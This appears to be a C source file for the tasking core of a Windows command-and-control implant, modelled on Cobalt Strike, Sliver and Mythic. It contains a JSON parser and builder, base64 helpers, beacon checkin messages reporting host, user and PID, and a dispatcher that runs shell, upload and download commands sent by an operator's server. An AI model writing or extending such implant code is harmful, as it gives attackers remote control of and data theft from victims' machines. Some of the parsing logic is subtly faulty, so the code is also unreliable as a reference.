/*
 * JSON Parsing - Minimal C2 protocol
 * Cobalt Strike, Sliver, Mythic patterns
 */

#include <windows.h>

// ============================================================================
// TYPES
// ============================================================================

typedef enum { J_NULL, J_BOOL, J_NUM, J_STR, J_ARR, J_OBJ } JTYPE;

typedef struct _JV {
    JTYPE type;
    union {
        BOOL   b;
        double n;
        char*  s;
        struct { struct _JV* items; int cnt; } arr;
        struct { char** keys; struct _JV* vals; int cnt; } obj;
    };
} JV;

// ============================================================================
// PARSER
// ============================================================================

static char* skip(char* s) { while(*s && *s <= ' ') s++; return s; }

static char* p_str(char* s, char** out)
{
    if(*s != '"') return 0;
    char* start = ++s;
    while(*s && *s != '"') { if(*s == '\\') s++; s++; }
    int len = s - start;
    *out = HeapAlloc(GetProcessHeap(), 0, len + 1);
    for(int i = 0, j = 0; i < len; i++) {
        if(start[i] == '\\') i++;
        (*out)[j++] = start[i];
    }
    (*out)[len] = 0;
    return s + 1;
}

static char* p_num(char* s, double* out)
{
    double n = 0, sign = 1;
    if(*s == '-') { sign = -1; s++; }
    while(*s >= '0' && *s <= '9') n = n * 10 + (*s++ - '0');
    if(*s == '.') {
        s++; double d = 0.1;
        while(*s >= '0' && *s <= '9') { n += (*s++ - '0') * d; d *= 0.1; }
    }
    *out = n * sign;
    return s;
}

static char* p_val(char*, JV*);

static char* p_arr(char* s, JV* v)
{
    if(*s != '[') return 0;
    s = skip(s + 1);
    v->type = J_ARR; v->arr.items = 0; v->arr.cnt = 0;
    if(*s == ']') return s + 1;

    int cap = 8;
    v->arr.items = HeapAlloc(GetProcessHeap(), 0, cap * sizeof(JV));

    while(*s) {
        if(v->arr.cnt >= cap) {
            cap *= 2;
            v->arr.items = HeapReAlloc(GetProcessHeap(), 0, v->arr.items, cap * sizeof(JV));
        }
        s = p_val(skip(s), &v->arr.items[v->arr.cnt++]);
        if(!s) return 0;
        s = skip(s);
        if(*s == ']') return s + 1;
        if(*s != ',') return 0;
        s++;
    }
    return 0;
}

static char* p_obj(char* s, JV* v)
{
    if(*s != '{') return 0;
    s = skip(s + 1);
    v->type = J_OBJ; v->obj.keys = 0; v->obj.vals = 0; v->obj.cnt = 0;
    if(*s == '}') return s + 1;

    int cap = 8;
    v->obj.keys = HeapAlloc(GetProcessHeap(), 0, cap * sizeof(char*));
    v->obj.vals = HeapAlloc(GetProcessHeap(), 0, cap * sizeof(JV));

    while(*s) {
        if(v->obj.cnt >= cap) {
            cap *= 2;
            v->obj.keys = HeapReAlloc(GetProcessHeap(), 0, v->obj.keys, cap * sizeof(char*));
            v->obj.vals = HeapReAlloc(GetProcessHeap(), 0, v->obj.vals, cap * sizeof(JV));
        }
        s = skip(s);
        s = p_str(s, &v->obj.keys[v->obj.cnt]);
        if(!s) return 0;
        s = skip(s);
        if(*s != ':') return 0;
        s = p_val(skip(s + 1), &v->obj.vals[v->obj.cnt]);
        if(!s) return 0;
        v->obj.cnt++;
        s = skip(s);
        if(*s == '}') return s + 1;
        if(*s != ',') return 0;
        s++;
    }
    return 0;
}

static char* p_val(char* s, JV* v)
{
    s = skip(s);
    if(!*s) return 0;

    if(*s == 'n') { v->type = J_NULL; return s + 4; }
    if(*s == 't') { v->type = J_BOOL; v->b = 1; return s + 4; }
    if(*s == 'f') { v->type = J_BOOL; v->b = 0; return s + 5; }
    if(*s == '"') { v->type = J_STR; return p_str(s, &v->s); }
    if(*s == '[') return p_arr(s, v);
    if(*s == '{') return p_obj(s, v);
    if(*s == '-' || (*s >= '0' && *s <= '9')) { v->type = J_NUM; return p_num(s, &v->n); }

    return 0;
}

// ============================================================================
// ACCESSORS
// ============================================================================

JV* j_get(JV* obj, char* key)
{
    if(obj->type != J_OBJ) return 0;
    for(int i = 0; i < obj->obj.cnt; i++) {
        char* k = obj->obj.keys[i];
        char* p = key;
        while(*k && *p && *k == *p) { k++; p++; }
        if(!*k && !*p) return &obj->obj.vals[i];
    }
    return 0;
}

char* j_str(JV* obj, char* key)
{
    JV* v = j_get(obj, key);
    return (v && v->type == J_STR) ? v->s : 0;
}

int j_int(JV* obj, char* key)
{
    JV* v = j_get(obj, key);
    return (v && v->type == J_NUM) ? (int)v->n : 0;
}

BOOL j_bool(JV* obj, char* key)
{
    JV* v = j_get(obj, key);
    return (v && v->type == J_BOOL) ? v->b : 0;
}

JV* j_arr(JV* obj, char* key)
{
    JV* v = j_get(obj, key);
    return (v && v->type == J_ARR) ? v : 0;
}

// ============================================================================
// BUILDER
// ============================================================================

typedef struct { char* buf; int len; int cap; } JB;

void jb_init(JB* jb)
{
    jb->cap = 256;
    jb->buf = HeapAlloc(GetProcessHeap(), 0, jb->cap);
    jb->len = 0;
    jb->buf[0] = 0;
}

void jb_app(JB* jb, char* s)
{
    int l = 0; while(s[l]) l++;
    if(jb->len + l >= jb->cap) {
        jb->cap *= 2;
        jb->buf = HeapReAlloc(GetProcessHeap(), 0, jb->buf, jb->cap);
    }
    for(int i = 0; i <= l; i++) jb->buf[jb->len + i] = s[i];
    jb->len += l;
}

void jb_str(JB* jb, char* s)
{
    jb_app(jb, "\"");
    // Escape special chars
    char* p = s;
    char tmp[2] = {0};
    while(*p) {
        if(*p == '"' || *p == '\\') jb_app(jb, "\\");
        tmp[0] = *p++;
        jb_app(jb, tmp);
    }
    jb_app(jb, "\"");
}

void jb_int(JB* jb, int n)
{
    char buf[16];
    int i = 15, neg = 0;
    buf[i] = 0;
    if(n < 0) { neg = 1; n = -n; }
    if(n == 0) buf[--i] = '0';
    while(n) { buf[--i] = '0' + (n % 10); n /= 10; }
    if(neg) buf[--i] = '-';
    jb_app(jb, buf + i);
}

// ============================================================================
// C2 PROTOCOL
// ============================================================================

/*
 * Beacon -> Server (checkin):
 * {"t":"c","id":"xxx","h":"HOST","u":"user","p":1234}
 *
 * Server -> Beacon (task):
 * {"t":"x","i":1,"c":"shell","a":["whoami"]}
 *
 * Beacon -> Server (result):
 * {"t":"r","i":1,"s":0,"o":"base64..."}
 */

char* mk_checkin(char* id, char* host, char* user, DWORD pid)
{
    JB jb;
    jb_init(&jb);
    jb_app(&jb, "{\"t\":\"c\",\"id\":");
    jb_str(&jb, id);
    jb_app(&jb, ",\"h\":");
    jb_str(&jb, host);
    jb_app(&jb, ",\"u\":");
    jb_str(&jb, user);
    jb_app(&jb, ",\"p\":");
    jb_int(&jb, pid);
    jb_app(&jb, "}");
    return jb.buf;
}

char* mk_result(int task_id, int status, char* b64out)
{
    JB jb;
    jb_init(&jb);
    jb_app(&jb, "{\"t\":\"r\",\"i\":");
    jb_int(&jb, task_id);
    jb_app(&jb, ",\"s\":");
    jb_int(&jb, status);
    jb_app(&jb, ",\"o\":");
    jb_str(&jb, b64out);
    jb_app(&jb, "}");
    return jb.buf;
}

// ============================================================================
// BASE64 (binary in JSON)
// ============================================================================

static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void b64_enc(BYTE* in, DWORD inlen, char* out)
{
    DWORD i, j = 0;
    for(i = 0; i < inlen; i += 3) {
        DWORD n = (in[i] << 16) |
                  ((i+1 < inlen ? in[i+1] : 0) << 8) |
                  (i+2 < inlen ? in[i+2] : 0);

        out[j++] = b64[(n >> 18) & 63];
        out[j++] = b64[(n >> 12) & 63];
        out[j++] = (i+1 < inlen) ? b64[(n >> 6) & 63] : '=';
        out[j++] = (i+2 < inlen) ? b64[n & 63] : '=';
    }
    out[j] = 0;
}

int b64_dec(char* in, BYTE* out)
{
    static BYTE d[128] = {0};
    if(!d['A']) {
        for(int i = 0; i < 64; i++) d[(BYTE)b64[i]] = i;
    }

    int j = 0;
    for(int i = 0; in[i] && in[i] != '='; i += 4) {
        DWORD n = (d[(BYTE)in[i]] << 18) | (d[(BYTE)in[i+1]] << 12) |
                  (d[(BYTE)in[i+2]] << 6) | d[(BYTE)in[i+3]];
        out[j++] = (n >> 16) & 0xFF;
        if(in[i+2] != '=') out[j++] = (n >> 8) & 0xFF;
        if(in[i+3] != '=') out[j++] = n & 0xFF;
    }
    return j;
}

// ============================================================================
// TASK DISPATCHER
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD id;
    DWORD cmd;
    DWORD arglen;
} TASK_HDR;
#pragma pack(pop)

typedef void (*TASK_FN)(DWORD, BYTE*, DWORD, BYTE**, DWORD*);

#define CMD_NOP    0x00
#define CMD_EXIT   0x01
#define CMD_SHELL  0x10
#define CMD_UPLOAD 0x20
#define CMD_DOWNLOAD 0x21

void dispatch(char* json, TASK_FN* handlers, int nhandlers, char** response)
{
    JV root;
    if(!p_val(json, &root) || root.type != J_OBJ) return;

    char* type = j_str(&root, "t");
    if(!type || *type != 'x') return;  // Not a task

    int id = j_int(&root, "i");
    char* cmd = j_str(&root, "c");
    JV* args = j_arr(&root, "a");

    if(!cmd) return;

    // Map command string to handler
    DWORD cmd_id = 0;
    if(cmd[0] == 's' && cmd[1] == 'h') cmd_id = CMD_SHELL;
    else if(cmd[0] == 'u' && cmd[1] == 'p') cmd_id = CMD_UPLOAD;
    else if(cmd[0] == 'd' && cmd[1] == 'o') cmd_id = CMD_DOWNLOAD;
    else if(cmd[0] == 'e' && cmd[1] == 'x') cmd_id = CMD_EXIT;

    if(cmd_id < nhandlers && handlers[cmd_id]) {
        BYTE* out = 0;
        DWORD outlen = 0;

        // Get first arg as bytes
        BYTE* argdata = 0;
        DWORD arglen = 0;
        if(args && args->arr.cnt > 0 && args->arr.items[0].type == J_STR) {
            char* arg = args->arr.items[0].s;
            arglen = 0; while(arg[arglen]) arglen++;
            argdata = (BYTE*)arg;
        }

        handlers[cmd_id](id, argdata, arglen, &out, &outlen);

        // Build response
        if(out && outlen) {
            char* b64 = HeapAlloc(GetProcessHeap(), 0, (outlen * 4 / 3) + 8);
            b64_enc(out, outlen, b64);
            *response = mk_result(id, 0, b64);
            HeapFree(GetProcessHeap(), 0, out);
            HeapFree(GetProcessHeap(), 0, b64);
        } else {
            *response = mk_result(id, 0, "");
        }
    }
}

// ============================================================================
// EOF
// ============================================================================
